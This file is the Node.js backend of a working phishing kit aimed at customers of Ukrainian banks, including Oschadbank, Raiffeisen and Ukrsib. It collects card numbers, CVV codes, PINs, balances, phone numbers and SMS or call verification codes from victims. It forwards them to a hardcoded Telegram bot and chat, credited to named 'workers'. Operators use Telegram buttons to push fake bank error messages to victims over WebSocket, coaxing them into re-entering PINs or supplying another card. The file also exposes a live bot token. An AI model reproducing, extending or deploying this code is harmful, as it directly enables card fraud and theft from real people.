const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// –ù–ê–°–¢–†–û–ô–ö–ò
const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
const CHAT_ID = '-4970332008';

// –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π webhook –¥–ª—è Render
const hostname = process.env.RENDER_EXTERNAL_HOSTNAME || `localhost:${process.env.PORT || 3000}`;
const WEBHOOK_URL = `https://${hostname}/bot${TELEGRAM_BOT_TOKEN}`;

// –°–ü–ò–°–û–ö –ë–ê–ù–ö–û–í –î–õ–Ø –ö–ù–û–ü–ö–ò "–ó–ê–ü–†–û–°"
const banksForRequestButton = [
    '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω', '–í–æ—Å—Ç–æ–∫', 'Izibank', '–£–∫—Ä—Å–∏–±'
];

const app = express();
app.use(express.json());
app.use(cors());

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–ø—Ä–æ—Å–æ–≤
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

// –û–±—Å–ª—É–∂–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –∏–∑ –∫–æ—Ä–Ω—è
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ webhook –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏
bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

// –¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
bot.sendMessage(CHAT_ID, '–ü–†–û–ï–ö–¢ –£–°–ü–ï–®–ù–û –°–¢–ê–õ –ù–ê –°–ï–†–í–ï–†! –•–æ—Ä–æ—à–µ–≥–æ –≤–æ—Ä–∫–∞! –¢–µ—Å—Ç –æ—Ç ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

// –¢–µ—Å—Ç –±–æ—Ç–∞
bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

// Webhook –¥–ª—è Telegram
app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ 
    server,
    path: '/ws' // –î–æ–±–∞–≤–ª—è–µ–º –ø—É—Ç—å –¥–ª—è WS
});

const clients = new Map();
const sessions = new Map();
const cardVisits = new Map(); // –î–ª—è –ø–æ–¥—Å—á—ë—Ç–∞ –ø–æ –Ω–æ–º–µ—Ä—É –∫–∞—Ä—Ç—ã

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = message.toString();
            if (data === 'ping') {
                ws.send('pong');
                return;
            }
            const parsed = JSON.parse(data);
            if (parsed.type === 'register' && parsed.sessionId) {
                clients.set(parsed.sessionId, ws);
                console.log(`Client registered: ${parsed.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, referrer, bankTheme, ...stepData } = req.body;

    // –î–µ–∫–æ–¥–∏—Ä—É–µ–º referrer –∏–∑ Base64
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, theme=${bankTheme}, data keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    // –ü–æ–¥—Å—á—ë—Ç –ø–æ –Ω–æ–º–µ—Ä—É –∫–∞—Ä—Ç—ã
    const cardNumber = newData.card_confirm || newData.card;
    if (cardNumber) {
        const cardKey = cardNumber.replace(/\s/g, '');
        const cardData = cardVisits.get(cardKey) || { visitCount: 0 };
        cardData.visitCount++;
        cardVisits.set(cardKey, cardData);
        newData.cardVisitCount = cardData.visitCount;
    }

    if (newData.call_code_input) {
        let message = `<b>üîî –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–¥ —ñ–∑ –¥–∑–≤—ñ–Ω–∫–∞ (–û—â–∞–¥–±–∞–Ω–∫)!</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${newData.call_code_input}</code>\n`;
        message += `<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = `<b>–ù–æ–≤–∏–π –ª–æ–≥!</b>\n\n`;
        message += `<b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${newData.bankName}\n`;
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card_confirm || newData.card || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        if (newData['card-expiry']) message += `<b>–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>–ü—ñ–Ω:</b> <code>${newData.pin || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        if (newData.balance) message += `<b>–ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å:</b> <code>${newData.balance}</code>\n`;
        if (newData.cardVisitCount) {
            const visitText = newData.cardVisitCount === 1 ? 'NEW' : `${newData.cardVisitCount} —Ä–∞–∑`;
            message += `<b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤ –ø–æ –∫–∞—Ä—Ç—ñ:</b> ${visitText}\n`;
        } else {
            const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} —Ä–∞–∑`;
            message += `<b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ${visitText}\n`;
        }
        message += `<b>Worker:</b> @${workerNick}\n`;

        sendToTelegram(message, sessionId, newData.bankName, bankTheme);
    }

    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code, referrer } = req.body;

    // –î–µ–∫–æ–¥–∏—Ä—É–µ–º referrer –∏–∑ Base64
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`SMS for ${sessionId}: code=${code}`);
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>–û—Ç—Ä–∏–º–∞–Ω–æ SMS!</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${code}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName, bankTheme) {
    let keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: '–õ–ö', callback_data: `lk_${bankTheme}:${sessionId}` }
        ],
        [
            { text: '–ó–í–û–ù–û–ö', callback_data: `call_oschad:${sessionId}` }
        ],
        [
            { text: '–ü–Ü–ù', callback_data: `pin_error:${sessionId}` },
            { text: '–ö–û–î', callback_data: `code_error:${sessionId}` },
            { text: '–ö–û–î ‚úÖ', callback_data: `timer:${sessionId}` }
        ],
        [
            { text: '–ù–û–ú–ï–†', callback_data: `number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `other:${sessionId}` }
        ],
        [
            { text: 'BAN', callback_data: `ban:${sessionId}` },
            { text: '–°–í–û–ô', callback_data: `custom:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[1].push({ text: '–ó–ê–ü–†–û–°', callback_data: `request_details:${sessionId}` });
    }

    // –ï—Å–ª–∏ –±–∞–Ω–∫ –Ω–µ –û—â–∞–¥, —É–±–∏—Ä–∞–µ–º –ó–í–û–ù–û–ö
    if (bankName !== '–û—â–∞–¥–±–∞–Ω–∫') {
        keyboard = keyboard.filter(row => row[0].text !== '–ó–í–û–ù–û–ö');
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const parts = callbackQuery.data.split(':');
    const type = parts[0];
    const sessionId = parts[1];
    console.log(`Callback: type=${type}, sessionId=${sessionId}`); // Debug
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};

        switch (type) {
            case 'sms':
                commandData = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º –Ω–∞ –º–æ–±—ñ–ª—å–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ —É —Ñ–æ—Ä–º—É –≤–≤–æ–¥—É –∫–æ–¥—É" };
                ws.send(JSON.stringify({ type: 'sms', data: commandData }));
                break;
            case 'lk_oschadbank':
            case 'lk_raiffeisen':
            case 'lk_vostok':
            case 'lk_izibank':
            case 'lk_ukrsib':
                ws.send(JSON.stringify({ type, data: {} }));
                break;
            case 'call_oschad':
                ws.send(JSON.stringify({ type: 'call_oschad', data: {} }));
                break;
            case 'request_details':
                ws.send(JSON.stringify({ type: 'request_details', data: {} }));
                break;
            case 'other':
                commandData = { text: "–í –Ω–∞—Å –Ω–µ –≤–∏–π—à–ª–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤–∞—à—É –∫–∞—Ä—Ç–∫—É. –î–ª—è –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è –ø—Ä–æ–ø–æ–Ω—É—î–º–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É —ñ–Ω—à–æ–≥–æ –±–∞–Ω–∫—É" };
                ws.send(JSON.stringify({ type: 'other', data: commandData }));
                break;
            case 'pin_error':
                commandData = { text: "–ù–µ–≤—ñ—Ä–Ω–∏–π –ü–Ü–ù, –í–∏ –Ω–µ –∑–º–æ–≥–ª–∏ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –∫–∞—Ä—Ç–∫–æ—é. –î–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –∫–∞—Ä—Ç–∫–æ—é –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞–∑–∞–¥ —Ç–∞ –∑–∞–ø–æ–≤–Ω—ñ—Ç—å —Ñ–æ—Ä–º—É –∑ –≤—ñ—Ä–Ω–∏–º –ø—ñ–Ω-–∫–æ–¥–æ–º" };
                ws.send(JSON.stringify({ type: 'pin_error', data: commandData }));
                break;
            case 'number_error':
                commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ —Ñ—ñ–Ω–∞–Ω—Å–æ–≤–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –Ω–æ–º–µ—Ä —è–∫–∏–π –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –¥–æ –≤–∞—à–æ—ó –∫–∞—Ä—Ç–∫–∏." };
                ws.send(JSON.stringify({ type: 'number_error', data: commandData }));
                break;
            case 'ban':
                ws.send(JSON.stringify({ type: 'ban', data: {} }));
                break;
            case 'custom':
                // –î–ª—è "–°–í–û–ô" - –∂–¥—ë–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç –∞–¥–º–∏–Ω–∞
                bot.sendMessage(CHAT_ID, '–í–≤–µ–¥—ñ—Ç—å —Ç–µ–∫—Å—Ç –¥–ª—è –∫–ª—ñ—î–Ω—Ç–∞:', {
                    reply_markup: {
                        inline_keyboard: [[{ text: '–í—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏', callback_data: `send_custom:${sessionId}` }]]
                    }
                });
                // –ó–¥–µ—Å—å –Ω—É–∂–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å —Å–ª–µ–¥—É—é—â–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ, –Ω–æ –¥–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º force_reply –∏–ª–∏ –æ—Ç–¥–µ–ª—å–Ω—ã–π handler
                // –í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –¥–æ–±–∞–≤–∏—Ç—å bot.on('message') –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏
                break;
            case 'send_custom':
                // –≠—Ç–æ —É–ø—Ä–æ—â—ë–Ω–Ω–æ; –≤ –ø–æ–ª–Ω–æ–º –∫–æ–¥–µ –Ω—É–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å pending custom messages
                const pendingText = '–í–∞—à –∫–∞—Å—Ç–æ–º–Ω–∏–π —Ç–µ–∫—Å—Ç —Ç—É—Ç'; // –ó–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π –≤–≤–æ–¥
                ws.send(JSON.stringify({ type: 'custom', data: { text: pendingText } }));
                break;
        }
        bot.answerCallbackQuery(callbackQuery.id, { text: `–ö–æ–º–∞–Ω–¥–∞ "${type}" –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: '–ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ!', show_alert: true });
        console.log(`WS not found for ${sessionId}, state: ${ws ? ws.readyState : 'null'}`);
    }
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π (—É–ø—Ä–æ—â—ë–Ω–Ω–æ)
bot.on('message', (msg) => {
    if (msg.text && msg.chat.id.toString() === CHAT_ID) {
        // –õ–æ–≥–∏–∫–∞ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç–∞ –∫–ª–∏–µ–Ω—Ç—É (–Ω—É–∂–µ–Ω sessionId –∏–∑ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞)
        // –î–ª—è —ç—Ç–æ–≥–æ –Ω—É–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å —Å–æ—Å—Ç–æ—è–Ω–∏–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä –≤ Map pendingCustom[chatId] = {sessionId, text}
        // –ó–¥–µ—Å—å placeholder
    }
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ Telegram
bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

// –ì–ª–æ–±–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
